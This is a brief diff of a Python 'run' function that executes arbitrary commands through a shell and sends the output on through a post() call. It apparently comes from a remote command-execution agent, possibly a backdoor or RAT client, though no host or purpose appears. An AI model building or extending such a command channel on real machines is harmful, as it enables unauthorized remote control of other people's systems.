@@ -31,11 +31,12 @@ def run(command):
 	
 	elif command == "pwd":
 		result = os.getcwd()
+		return result
 
 	else:
 		process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 		result  = process.stdout.read() + process.stderr.read()
 		
-		if result == "": result = " "
+		if result == "": return "[>] Command executed"
 
 	return post(result)
